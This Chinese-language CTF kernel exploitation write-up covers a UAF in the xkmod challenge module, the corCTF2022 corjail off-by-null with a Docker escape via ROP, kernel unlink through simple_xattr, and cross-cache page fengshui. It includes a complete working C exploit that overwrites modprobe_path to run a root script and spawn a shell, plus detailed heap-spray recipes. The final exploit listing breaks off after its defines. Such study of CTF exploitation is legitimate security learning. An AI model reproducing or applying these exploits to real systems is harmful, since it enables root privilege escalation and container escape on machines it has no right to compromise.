    copy_from_user(&input, data, 16LL);
    if ( cmd == 107374182 )
    {
      p_input = buf;
      if ( buf && input.len <= 0x50u && input.offset <= 0x70u )
      {
        copy_from_user(&buf[input.offset], input.user_buf, (int)input.len);
        return;
      }
    }
    else
    {
      if ( cmd != 125269879 )
      {
        if ( cmd == 17895697 )
          buf = (char *)kmem_cache_alloc(s, 3264LL);
        return;
      }
      v5 = buf;
      if ( buf && input.len <= 0x50u && input.offset <= 0x70u )
      {
        copy_to_user(input.user_buf, &buf[input.offset], (int)input.len);
        return;
      }
    }
    xkmod_ioctl_cold((__int64)p_input, (__int64)v5);
  }
}

int __fastcall xkmod_release(inode *inode, file *file)
{
  return kmem_cache_free(s, buf);
}
```

close后buf没有清空，依然可以修改buf或者泄露buf的内容

- 打开多个`/dev/xkmod`
- 第一个描述符add，然后关闭掉
- 第二个描述符read，泄露object地址，然后通过异或来得到堆基地址
- 第二个描述符write，写freelist为（page\_offset\_base） + 0x9d00-0x10(此时对应的freelist为null，这样系统会向buddysystem请求新slab，否则如果freelist不是有效的，kernel会panic)
- 第二个描述符add 两次，此时buf为（page\_offset\_base） + 0x9d00-0x10，read可泄露内核基地址
- 第二个描述add，然后关闭
- 第三个描述write，写freelist为modprobe\_path -0x10(也是保证freelist为NULL)
- 第三个描述add两次，此时buf为modprobe\_path-0x10，然后write写为恶意脚本路径
- 然后创建格式错误文件，执行错误文件将会跳转到恶意脚本执行，里面改flag权限为777（执行恶意脚本为root权限）
- 然后起个shell就可以读flag

### exp

```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <asm/ldt.h>
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/io.h>

size_t modprobe_path = 0xFFFFFFFF82444700;

void qword_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("[*] %s:\n", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void bind_core(int core) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

struct Data {
    size_t *buf;
    u_int32_t offset;
    u_int32_t size;
};

void alloc_buf(int fd, struct Data *data) {
    ioctl(fd, 0x1111111, data);
}

void write_buf(int fd, struct Data *data) {
    ioctl(fd, 0x6666666, data);
}

void read_buf(int fd, struct Data *data) {
    ioctl(fd, 0x7777777, data);
}

int main() {
    bind_core(0);

    int xkmod_fd[5];
    for (int i = 0; i < 3; i++) {
        xkmod_fd[i] = open("/dev/xkmod", O_RDONLY);
        if (xkmod_fd[i] < 0) {
            printf("[-] %d Failed to open xkmod.", i);
            exit(-1);
        }
    }

    struct Data data = {malloc(0x1000), 0, 0x50};
    alloc_buf(xkmod_fd[0], &data);
    close(xkmod_fd[0]);

    read_buf(xkmod_fd[1], &data);
    qword_dump("buf", data.buf, 0x50);

    size_t page_offset_base = data.buf[0] & 0xFFFFFFFFF0000000;
    printf("[+] page_offset_base: %p\n", page_offset_base);

    data.buf[0] = page_offset_base + 0x9d000 - 0x10;
    write_buf(xkmod_fd[1], &data);
    alloc_buf(xkmod_fd[1], &data);
    alloc_buf(xkmod_fd[1], &data);

    data.size = 0x50;
    read_buf(xkmod_fd[1], &data);
    qword_dump("buf", data.buf, 0x50);

    size_t kernel_offset = data.buf[2] - 0xffffffff81000030;
    printf("kernel offset: %p\n", kernel_offset);
    modprobe_path += kernel_offset;

    close(xkmod_fd[1]);
    data.buf[0] = modprobe_path - 0x10;
    write_buf(xkmod_fd[2], &data);
    alloc_buf(xkmod_fd[2], &data);
    alloc_buf(xkmod_fd[2], &data);
    strcpy((char *) &data.buf[2], "/home/shell.sh");
    write_buf(xkmod_fd[2], &data);

    if (open("/shell.sh", O_RDWR) < 0) {
        system("echo '#!/bin/sh' >> /home/shell.sh");
        system("echo 'chmod 777 /flag' >> /home/shell.sh");
        system("chmod +x /home/shell.sh");
    }
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    system("/home/fake");
    if (open("/flag", O_RDWR) < 0) {
        puts("[-] Failed to hijack!");
        _exit(-1);
    }
    puts("[+] hijack success");
    system("/bin/sh");

    return 0;
}
```

Off By Null
===========

题目 corCTF2022 corjail（kmalloc-4k）  
<https://blog.csdn.net/panhewu9919/article/details/127804902>  
[https://xz.aliyun.com/t/12488?time\_\_1311=GqGxRQqiqmw4lrzG7Dy7QDkDcmoOI6fQ3x](https://xz.aliyun.com/t/12488?time__1311=GqGxRQqiqmw4lrzG7Dy7QDkDcmoOI6fQ3x)

调试
--

> 感谢tplus师傅和Nightu师傅的帮助！！！

intel不支持该运行，`qemu-system-x86_64: warning: host doesn't support requested feature: CPUID.80000001H:ECX.svm [bit 2`，Nightu师傅给出的建议是-cpu max，还不行就寄了，所以这里就只分析下思路和exp吧

- qcow镜像改root权限 
    1. Kernel Command Line (cmdline):  
        这是在内核启动时传递给它的参数列表。它可以在bootloader (如GRUB) 配置中设置。

2. init 系统选择:
    
    
    - 如果在 cmdline 中没有特别指定 init 系统，内核会尝试按以下顺序查找并执行初始化程序：  
        a) /sbin/init  
        b) /etc/init  
        c) /bin/init  
        d) /bin/sh
3. systemd:
    
    
    - 如果系统使用 systemd，通常 /sbin/init 是指向 systemd 可执行文件的符号链接。
    - 可以在 cmdline 中明确指定使用 systemd，例如：`init=/lib/systemd/systemd`

题目需要ext4文件系统,可以用[create-image.sh](https://github.com/google/syzkaller/blob/master/tools/create-image.sh)制作

漏洞
--

保护全开

题目的readme是让我们操作`/proc_rw/cormon`虽然`/proc/cormon`也存在，但还是按照题目的来

当往`/proc/cormon`写的时候cormon\_proc\_write存在off by one 的溢出

```c
static ssize_t cormon_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) 
{
    loff_t offset = *ppos;
    char *syscalls;
    size_t len;

    if (offset < 0)
        return -EINVAL;

    if (offset >= PAGE_SIZE || !count)
        return 0;

    len = count > PAGE_SIZE ? PAGE_SIZE - 1 : count;
    //count 等于PAGE_SIZE 时就是原值，
    syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC);
    printk(KERN_INFO "[CoRMon::Debug] Syscalls @ %#llx\n", (uint64_t)syscalls);

    if (!syscalls)
    {
        printk(KERN_ERR "[CoRMon::Error] kmalloc() call failed!\n");
        return -ENOMEM;
    }

    if (copy_from_user(syscalls, ubuf, len)) //复制PAGE_SIZE大小
    {
        printk(KERN_ERR "[CoRMon::Error] copy_from_user() call failed!\n");
        return -EFAULT;
    }

    syscalls[len] = '\x00';  // 多一个出来

    if (update_filter(syscalls))
    {
        kfree(syscalls);
        return -EINVAL;
    }

    kfree(syscalls);  //释放掉PAGE_SIZE 大小的object

    return count;
}
```

利用
--

页级cache的offbyone，溢出改相邻地址的object的低一个字节为零字节，如果此时相邻地址的object的的前八个字节也是指向一个object，然后覆盖后指向的object是已经释放的，就能够造成UAF

### poll

`poll` 函数是一种多路复用技术，用于监控多个文件描述符（通常是套接字或管道），以确定它们是否有数据可读、可写，或是否有错误发生。

1. **监控多个文件描述符**：`poll` 可以同时监控多个文件描述符的状态变化，这些描述符可以是打开的文件、网络套接字等。
2. **事件检测**：它能够检测不同的事件类型，比如：
    
    
    - **POLLIN**：数据可读。
    - **POLLOUT**：数据可写。
    - **POLLERR**：错误发生。
    - **POLLHUP**：挂起事件（对端关闭连接）。

`poll` 函数的典型使用步骤是：

1. 初始化一个 `pollfd` 结构数组（每个结构对应一个文件描述符）。
2. 设置要监控的事件类型。
3. 调用 `poll` 函数，传入 `pollfd` 数组及其大小，以及一个超时时间。
4. `poll` 返回时，检查每个 `pollfd` 结构的 `revents` 字段，判断哪些文件描述符发生了感兴趣的事件。

```c
//int poll(struct pollfd fds[], nfds_t nfds, int timeout); 
//fds:一个pollfd结构的数组
//nfds:表示'fds'数组中的文件描述符数量
//timeout:表示超时时间，单位是毫秒
#include <poll.h>
#include <unistd.h>

int main() {
    struct pollfd fds[2];
    int timeout_msecs = 5000; // 5秒超时
    int ret;

    // 假设我们有两个文件描述符fd1和fd2
    int fd1 = ...; // 打开文件或套接字
    int fd2 = ...; // 打开文件或套接字

    fds[0].fd = fd1;
    fds[0].events = POLLIN; // 监控可读事件

    fds[1].fd = fd2;
    fds[1].events = POLLIN; // 监控可读事件

    ret = poll(fds, 2, timeout_msecs); //监控5秒钟

    if (ret > 0) {
        if (fds[0].revents & POLLIN) {
            // fd1 有数据可读
        }
        if (fds[1].revents & POLLIN) {
            // fd2 有数据可读
        }
    } else if (ret == 0) {
        // 超时，没有文件描述符变为可操作状态
    } else {
        // 发生错误
    }

    return 0;
}
```

当我们使用poll函数来监视一个或多个文件描述符上的活动时，会在内核空间分配空间来存储poll\_list ，它会通过poll\_list 的entries来存储pollfd文件描述符，前三十个pollfd 组成的poll\_list放到栈上，后面的会根据最大为510个的pollfd 的poll\_list分配到object上，所以在object的分配范围从32到4096。

在所有poll\_list对象分配完之后，会有个对do\_poll的调用，它将监视所提供的文件描述符，直到一个特定的事件发生或计时器过期。

然后会一个while循环通过poll\_list-&gt;next是否为空用来遍历poll\_list单链表并释放结构

```c
struct poll_list {
    struct poll_list *next; // 指向下一个poll_list
    int len; // 对应于条目数组中pollfd结构的数量
    struct pollfd entries[]; // 存储pollfd结构的数组
};
```

### 初始化

- 使用assign\_to\_core()将当前进程绑定到CPU0，因为我们是在一个多核环境中工作，而slab是按CPU分配的。
- 堆喷大量的seq\_operations，填充kmalloc-32。将只有一点点或者不多的kmalloc-32塞满放入full使得申请新页来存放kmalloc-32，因为等会要保证在kmalloc-32的polist和同样是kmalloc-32的user\_key\_payload存在在一个页里，
    
    ### 喷poll\_list和user\_key\_payload
- poll\_list选择30+510+1个文件描述符的，这样会喷kamlloc-4096和kmalloc-32的object，之前不喷kamlloc-4096可能是因为就一个slab就8个kamlloc-4096，而且由于保护freelist不是挨着的，所以喷kamlloc-4096一段时间后此时基本都是在一个新slab喷了，所以此时cormon\_proc\_write喷一个kamlloc-4096然后等poll\_list喷满该slab大概率会相邻
- 然后kmalloc-32的poll\_list有可能和之前喷的kmalloc-32的user\_key\_payload存在在一个页，黄色是user\_key\_payload，绿色是poll\_list，蓝色是cormon\_proc\_write申请的一个kamlloc-4096，红色是受到溢出的poll\_list。 此时改溢出改poll\_list的的低字节为\\x00使得原先next指向在kmalloc-32的polist变为了在该页上的另一个之前堆喷产生的user\_key\_payload
- 当poll函数结束时分配的pollist都将被释放掉，此时沿着next来释放，此时被溢出的object的next指向user\_key\_payload，所以会释放该user\_key\_payload，但此时依然可以使用该user\_key\_payload，所以造成UAF
    
    > 喷注意user\_key\_payload的第一个QWORD必须为NULL（next为NULL时poll的遍历才终止）。可以使用setxattr函数来设置：具体来说就是kmalloc申请的堆块不一定是为NULL的，不过堆块的申请与释放遵循LIFO原则，所以可以先用setxattr函数（分配完之后就立即被释放）将堆块置空，再将堆块分配给user\_key\_payload结构。
    > 
    > ### 喷seq\_operations结构和keyctl\_read
- 然后再喷kmalloc-32的seq\_operations结构，造成之前被free掉的kmalloc-32的user\_key\_payload结构和seq\_operations结构重叠。

```c
struct user_key_payload {
    struct rcu_head rcu;        /* RCU destructor */
    unsigned short  datalen;    /* length of this data */
    char        data[] __aligned(__alignof__(u64)); /* actual data */
};

```

```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};

```

- 此时data部分正好存储show函数地址，keyctl\_read泄露基地址

### 喷射 ptmx

- 打开 ptmx 时，会分配 kmalloc-1024 tty\_struct 和 kmalloc-32 tty\_file\_private，其中 tty\_file\_private-&gt;tty 指向其对应的 tty\_struct 结构地址，此时喷射大量ptmx，使得 kmalloc-32 tty\_file\_private位于 kmalloc-32 的UAF的那个user\_key\_payload 的data的地址的较高地址部分 
    - 利用 user\_key\_payload 的越界读data（data是object上一定偏移的地址），就能泄露某个 kmalloc-32 tty\_file\_private的内容，其中就有kmalloc-1024 tty\_struct 的地址。

### seq释放后堆喷poll\_list和user\_key 释放后setxattr+堆喷user\_key 改UAF堆块

- 用seq\_operations的方式close()释放掉被seq\_operations和user\_key\_payload占据的kmalloc-32堆块。
- 然后用堆喷poll\_list对象占据kmalloc-32，此时UAF的堆块被user\_key\_payload和poll\_list占据。
- 释放掉user\_key\_payload对象，接着用setxattr函数和堆喷kmalloc-32的user\_key\_payload 将申请到UAF的堆块将堆块的第一个QWORD改为泄露出来的堆地址-0x18（就是用一次setxattr函数然后喷一个，这样循环 为0x18使得对应前八个字节为NULL，这样不会再继续遍历）修改后此时UAF堆块被user\_key\_payload 和polist占据

### 释放 tty\_struct堆喷pipe\_buffer 和poll\_list 释放堆喷user\_key\_payload 劫持pipe\_buffer

- 趁 poll\_list 还没有释放，释放 tty\_struct（之前泄露的kmalloc-1024的object地址是tty\_struct的） 并堆喷申请 pipe\_buffer ，将 target\_object 替换为 pipe\_buffer
- 之后 poll\_list 释放导致 target\_object - 0x18 区域释放。（可能需要释放所有user\_key\_payload 因为add\_key能申请的key是有上限的,超过了就无法申请）然后堆喷kmalloc-1024大小的 user\_key\_payload 劫持 target\_object - 0x18 ，从而劫持 pipe\_buffer 并布置rop

### rop

1. Docker 的安全限制：  
    Docker 通过 seccomp 禁用了 setns() 系统调用，这是一种安全机制，防止容器内的进程切换到其他命名空间。
2. 分析 setns() 源码：  
    发现 setns() 实际上调用了 commit\_nsset() 来完成命名空间切换。
3. 模仿 setns() 的行为：
    
    
    - 使用 copy\_fs\_struct() 克隆 init\_fs 结构。init\_fs 是初始（根）文件系统结构，克隆它可以获得对整个系统文件系统的访问权限。
    - 用 find\_task\_by\_vpid() 找到当前任务的结构。
    - 使用内核中的任意写入漏洞（通过 ROP gadget），将新的 fs\_struct 安装到当前任务中。（task\_struct 的 fs 指向 init\_fs ）

> 用find\_task\_by\_vpid() 来定位Docker容器任务，我们用switch\_task\_namespaces()将其nsproxy结构改为init\_nsproxy。但这还不足以从容器中逃逸。
> 
> 为什么仅仅改变 nsproxy 结构还不足以完全从容器中逃逸：

1. 部分逃逸：  
    使用 switch\_task\_namespaces() 将容器任务的 nsproxy 结构改为 init\_nsproxy 确实是逃逸过程的一部分。这一步使得容器进程在某些方面（如网络、PID等）能够看到主机系统的视图。
2. 不完整的逃逸：  
    然而，这种改变只影响了部分命名空间，而不是所有的隔离机制。特别是，文件系统的隔离仍然存在。
3. seccomp 限制：  
    Docker 使用 seccomp 过滤器来限制容器内可以使用的系统调用。setns() 被屏蔽意味着即使 nsproxy 结构被改变，进程也无法通过正常的系统调用来完全切换到新的命名空间。
4. 文件系统隔离：  
    容器的文件系统视图仍然是隔离的。要完全逃逸，还需要改变进程的文件系统视图，使其能够访问主机的完整文件系统。

> 在Docker容器中，与谷歌的kCTF不同，setns()被seccomp默认屏蔽了，这意味着我们在返回用户空间后不能用它来进入其他命名空间。我们需要找到一种替代方法，并且需要在ROP链中实现它。  
> 阅读setns()的源代码，我们可以看到它调用commit\_nsset()来实际移动任务到不同的命名空间。我们可以用copy\_fs\_struct()复制它的做法，克隆init\_fs结构，然后用find\_task\_by\_vpid() 定位当前任务，用 gadget 手动安装新fs\_struct。

Arbitrary Address Free（Only Heap Address）
=========================================

在内核利用的时候有时想通过修改一个 A 结构体的某个指针指向 B 结构体然后释放 A 结构体来释放 B 结构体从而实现 B 结构体的 UAF （如pollfd中的next，会根据next释放所有object，这个时候可以修改next为目标结构体）。

- 连续释放，导致结构体内部指向的位置B结构体的object被释放，但B结构体依然允许使用
- 通过申请C结构体来申请到被释放的B结构体的object，此时可以通过C结构体修改B结构体

> 然而有时候劫持 B 结构体的 C 结构体改不到 B 结构体的关键字段，这时后可以考虑把 A 结构体的指针改到 B 结构体地址减某个偏移的地方，这样 C 结构体的可控部分能够覆盖 B 结构体需修改的区域。

分析 kfree 源码可知 kmem\_cache 是通过 object 所在 page 获取的。

```c
void kfree(const void *x)
{
    struct page *page;
    void *object = (void *)x;

    trace_kfree(_RET_IP_, x);

    if (unlikely(ZERO_OR_NULL_PTR(x)))
        return;

    page = virt_to_head_page(x);
    if (unlikely(!PageSlab(page))) {
        BUG_ON(!PageCompound(page));
        kfree_hook(object);
        __free_pages(page, compound_order(page));
        return;
    }
    slab_free(page->slab_cache, page, object, NULL, 1, _RET_IP_);
}

```

之后又如下调用链：

```bash
kfree()
    slab_free()
        do_slab_free()
```

在 do\_slab\_free 中几乎没做检查，直接将该 object 链入到 freelist 上。因此可以进行堆上任意地址 free 。

```c

    if (likely(page == c->page)) {
        set_freepointer(s, tail_obj, c->freelist);

        if (unlikely(!this_cpu_cmpxchg_double(
                s->cpu_slab->freelist, s->cpu_slab->tid,
                c->freelist, tid,
                head, next_tid(tid)))) {

            note_cmpxchg_failure("slab_free", s, tid);
            goto redo;
        }
        stat(s, FREE_FASTPATH);
    }

```

Kernel Unlink
=============

当链表某个元素解链需要unlink，kernel unlink 主要作用是借助 unlink 的指针互写操作来实现任意地址写数据。

unlink 基于 list\_del 操作。伪造两个地址来替代 list\_head中的prev和next ，这样其中一个地址就会被写到另一个地址的内存上。如果我们能够控制 prev / next 指针，可以把 prev 指针设置为 modprobe\_path ，这样就会在 \[2\] 处将 next 值写入 prev 指向的内存。

问题：\[1\] 处，prev 会先写往 next-&gt;prev，这意味着 next 也必须是一个有效的指针，而后面需要将next写入prev-&gt;next，所以这限制了我们能写往 prev 的值。解决办法是，利用 physmap 提供一个有效的 prev 值。

```c

static inline void __list_del(struct list_head * prev, struct list_head * next)
{
    next->prev = prev;              // [1]
    WRITE_ONCE(prev->next, next);   // [2]
}
```

physmap的范围：0xffff888000000000-0xffffc87fffffffff

physmap 是一块内核虚拟内存，物理内存页连续映射到该处。所以prev劫持的地址可以从0xffff888000000000-0xffffc87fffffffff（存在偏移，根据实际偏移来决定可能的值）攻击者可以控制 prev 的低 4 字节，然后要保证高 4 字节表示 physmap 地址即可。

由于我们目标是修改 modprobe\_path ，可以构造 next = 0xffffxxxx2f706d74（系统内存至少有 0x2f706d7c 字节，大概 760M），若 prev = modprobe\_path + 1，利用 \[2\] 将 modprobe\_path 覆写为 /tmp/(0xffffxxxx 对应的字符)probe （其中 0xffffxxxx 是 prev 的高4字节）。后面即可提权。

```bash
例如
0xffff c87e 2f706d74
ÿÿ È~ /pmt
```

simple\_xattr （所有有链表解链操作的结构体都可以）
--------------------------------

1. setxattr

setxattr是一个系统调用,用于设置文件的扩展属性(extended attributes)。其基本语法是:

```c
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
```

- path: 文件路径
- name: 属性名
- value: 属性值
- size: 属性值的大小
- flags: 设置标志

例如:

```c
setxattr("/path/to/file", "user.myattr", "myvalue", 7, 0);
```

这会为文件设置一个名为"user.myattr"的扩展属性,值为"myvalue"。

2. simple\_xattr

simple\_xattr是Linux内核中用于管理扩展属性的一个结构体。它通常不直接被用户空间程序使用,而是内核用来存储和管理扩展属性的。

其结构大致如下:

```c
struct simple_xattr {
    struct list_head list;  // 用于链接多个xattr
    char *name;             // xattr的名称
    size_t size;            // xattr值的大小
    char value[];           // xattr的值,柔性数组成员
};

struct list_head {
    struct list_head *next, *prev;
};
```

- list: 用于将多个xattr链接在一起
- name: 属性名
- size: 属性值的大小
- value: 属性值(柔性数组成员)

每个文件的 simple\_xattr 以 list\_head 链表存起来。分配函数是 simple\_xattr\_alloc()，用户可控 simple\_xattr-&gt;value，分配大小是 kmalloc-32 到很大。

> simple\_xattr 不能修改，当对它进行编辑时，会把旧的 simple\_xattr 从链表unlink ，然后分配新的 simple\_xattr 并链接上去。这里可以通过UAF或者溢出来修改simple\_xattr，然后就是非特权用户无法设置 simple\_xattr，但是只要系统支持 user namespace 即可。

因此我们可以修改 simple\_xattr 来实现 unlink 攻击。但是该技术需要知道哪个 simple\_xattr 对象被覆盖了，否则随意移除 simple\_xattr 会导致遍历 list 时报错（如果移除的正常的 simple\_xattr 与异常的 simple\_xattr 相邻会将异常的 simple\_xattr 链入双向链表中）。

假设我们有一个文件系统，其中有一个文件 "secret.txt"，它有以下几个 xattr：

1. user.color = "red"
2. user.size = "large"
3. user.type = "confidential"

这些 xattr 在内核中可能以 simple\_xattr 对象的链表形式存储。

现在，攻击者想要利用 simple\_xattr 的漏洞进行攻击。他们的目标是覆盖 "user.size" 的 simple\_xattr 对象。

步骤：

1. 攻击者首先需要触发一个堆溢出或UAF漏洞，使得他们能够覆盖 "user.size" 的 simple\_xattr 对象。
2. 攻击者修改了 "user.size" 的 simple\_xattr 对象的list\_head。
3. 现在，攻击者想要利用这个被修改的对象进行进一步的攻击。
4. 如果攻击者随意移除一个 xattr，比如 "user.color"：
    
    ```php
    removexattr("secret.txt", "user.color")
    ```
    
    这可能会导致内核在遍历 xattr 链表时出错，因为链表结构已经被破坏。
5. 相反，攻击者应该精确地定位并操作 "user.size" xattr：
    
    ```php
    removexattr("secret.txt", "user.size")
    ```

覆盖simple\_xattr后如何找到对应的simple\_xattr有如下方法：

- 如果修改 simple\_xattr 的同时我们还能够读取 simple\_xattr的value（UAF来控制simple\_xattr），那么我们可以在创建 simple\_xattr 时通过设置 value 的值（setxattr 的 value 参数），然后来确定被覆盖的 simple\_xattr 对象。
- 可以都分配长度 0x100 字节的 name（setxattr 的 name 参数）那么 simple\_xattr -&gt;name 指针的最低 1 字节 为 0 （溢出修改simple\_xattr）。此时我们在覆盖 simple\_xattr 的 list\_head 的同时还顺便将 simple\_xattr -&gt;name 的最低 1 字节覆盖使得 name 指向原来 name 中间某个位置，这样我们就能确定被覆盖的 simple\_xattr 对应的 name 。

Cross-Cache Overflow &amp; Page-level Heap Fengshui
===================================================

<https://blog.xmcve.com/2023/10/12/Kernel-Heap---Cross-Cache-Overflow/>  
<https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/buddy/cross-cache/#stepii-page-level-heap-fengshui>

利用setsocket申请页
--------------

申请页：当我们创建一个 protocol 为 PF\_PACKET 的 socket 之后，先调用 setsockopt() 将 PACKET\_VERSION 设为 TPACKET\_V1/ TPACKET\_V2，再调用 setsockopt() 申请一个 PACKET\_TX\_RING 从而创建环形缓冲区，此时便存在如下调用链：

```bash
__sys_setsockopt()
    sock->ops->setsockopt()
        packet_setsockopt() // case PACKET_TX_RING ↓
            packet_set_ring()
                alloc_pg_vec()
最终调用
         order = get_order(req->tp_block_size);
        pg_vec = alloc_pg_vec(req, order);

相关使用函数
socket(PF_PACKET, SOCK_RAW, 768)        = 3
...
setsockopt(3, SOL_PACKET, PACKET_VERSION, [1], 4) = 0
...
setsockopt(3, SOL_PACKET, PACKET_RX_RING, {block_size=131072, block_nr=31, frame_size=65616, frame_nr=31}, 16) = 0
```

最终 alloc\_pg\_vec()实际上调用了内核当中的内存分配函数,这里注意是 block\_nr个 咱们提供的 order大小,这里的order取决于咱们的 block\_size，这里会创建一个pg\_vec 数组，用以分配 tp\_block\_nr 份 2的order次方张内存页，由于最后我们是通过单张页作为一个缓存slab布局的，所以这里每个setsockopt申请一张页就行

```c
struct pgv {
    char *buffer;
};

static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
{
    ...

    pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
    if (unlikely(!pg_vec))
        goto out;

    for (i = 0; i < block_nr; i++) {
        pg_vec[i].buffer = alloc_one_pg_vec_page(order);

    ...
}

static char *alloc_one_pg_vec_page(unsigned long order)
{
    char *buffer;
    gfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |
              __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;

    buffer = (char *) __get_free_pages(gfp_flags, order);
    if (buffer)
        return buffer;

    ...
}
```

并且由于存在检查，所以tp\_frame\_size 和tp\_frame\_nr 也需要构造

```c
err = -EINVAL;
        if (unlikely((int)req->tp_block_size <= 0))
            goto out;
        if (unlikely(!PAGE_ALIGNED(req->tp_block_size)))
            goto out;
        min_frame_size = po->tp_hdrlen + po->tp_reserve;
        if (po->tp_version >= TPACKET_V3 &&
            req->tp_block_size <
            BLK_PLUS_PRIV((u64)req_u->req3.tp_sizeof_priv) + min_frame_size)
            goto out;
        if (unlikely(req->tp_frame_size < min_frame_size))
            goto out;
        if (unlikely(req->tp_frame_size & (TPACKET_ALIGNMENT - 1)))
            goto out;

        rb->frames_per_block = req->tp_block_size / req->tp_frame_size;
        if (unlikely(rb->frames_per_block == 0))
            goto out;
        if (unlikely(rb->frames_per_block > UINT_MAX / req->tp_block_nr))
            goto out;
        if (unlikely((rb->frames_per_block * req->tp_block_nr) !=
                    req->tp_frame_nr))
            goto out;
```

最后的申请页的模板如下

```c
   socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
   version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
                     &version, sizeof(version));
      req.tp_block_size = size; //0x1000
    req.tp_block_nr = nr; //1
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
```

init\_module 创建了一个 kmem\_cache，分配的 object 的 size 为 512，创建 flag 为 SLAB\_ACCOUNT | SLAB\_PANIC，同时开启了 CONFIG\_MEMCG\_KMEM=y，这意味着这是一个独立的 kmem\_cache，由于没法在同一个slab中利用，只能通过页级来利用了

命名空间逃逸使用setsocket
-----------------

但在root的命名空间下我们是无法使用该原语的，所以需要开辟一个子进程，然后利用 unshare系统调用来创建一个新的子命名空间并应用到子进程当中，这样我们能保证新创建的子进程是可以使用该页级分配系统原语的，并且新创建的命名空间适用于执行unshare的进程（即子进程）及其后代

fork噪音处理和clone子进程flag的解决
------------------------

在 fork的过程当中，最为核心的函数就是 kernel\_clone，而clone中以下的flag能极大的降低fork当中产生的噪音：

```bash
CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND
```

当设置了这些flags之后，我们产生的噪音将会降低至下述情况

```bash

task_struct
kmalloc-64
vmap_area
vmap_area
cred_jar
signal_cache
pid
```

注意到这里仍然会由来自于 vmalloc的4个order\_0的page。  
这里还存在的问题是我们的子进程无法真正写入任何进程内存，因为它和父进程共享相同的虚拟内存，所以我们必须使用仅依赖于寄存器的shellcode（不写内存就行）来检查权限提升是否成功

进程管道通信
------

由于进程需要在另一个命名空间执行setsocket操作，所以通过管道和主进程通信

至于clone出来的进程如何知道自己当前的cred已经被提权了，可以通过设置一个管道和主进程通信，最后主进程完成所有堆喷溢出写后再通过管道发送给clone出来的进程，因为clone出来的进程一开始就执行读管道，所以直到主进程发送给clone进程，否则一直阻塞，然后clone会检查当前uid，然后执行`execve("/bin/sh", args, 0)`

利用
--

ioctl有添加object和编辑object，编译存在六字节溢出

- 先 分配大量的单张内存页，耗尽 buddy 中的 low-order pages和申请到一系列连续的内存

```c
  for (int i = 1; i < PGV_PAGE_NUM; i ++) {
        alloc_page(i);
    }
```

- 喷完后，后面部分申请的内存页一般是连续的，然后每间隔一张内存页释放掉下张内存页（关闭对应的socket，每张内存页对应一个socket），之后堆喷 cred（clone进程），这样便有几率获取到我们释放的单张内存页。

```c
  for (int i = 1; i < PGV_PAGE_NUM; i += 2) {
        free_page(i);
    }
 for (int i = 0; i < CRED_SPRAY_NUM; i++) {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) < 0) {
            …………
        }
    }
```

- 释放掉之前的间隔的内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页。此时有可能正好与cred所在的页连续，然后利用模块中漏洞进行越界写，篡改 cred-&gt;uid ，完成提权。 ```c
    for (int i = 0; i < PGV_PAGE_NUM; i += 2) {
        free_page(i);
    }
    memset(buf, 0, sizeof(buf));
    *(uint32_t *) &buf[VUL_OBJ_SIZE - 6] = 1;    /* cred->usage */
    for (int i = 0; i < VUL_OBJ_NUM; i++) {
        alloc();
        edit(i, VUL_OBJ_SIZE, buf);
    }
    ```

### 注意

pipe的参数需要是`int*`，不然其他总是通信不了

然后注意子进程检测是root起shell后，在主进程最后要通过sleep(1000),不然shell直接结束了

### exp

```c
#define _GNU_SOURCE 
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <assert.h>
#include <time.h>
#include <sys/socket.h>
#include <stdbool.h>

#define PACKET_VERSION 10
#define PACKET_TX_RING 13
#define CHUNK_SIZE 512
#define ALLOC 0xcafebabe
#define DELETE 0xdeadbabe
#define EDIT 0xf00dbabe
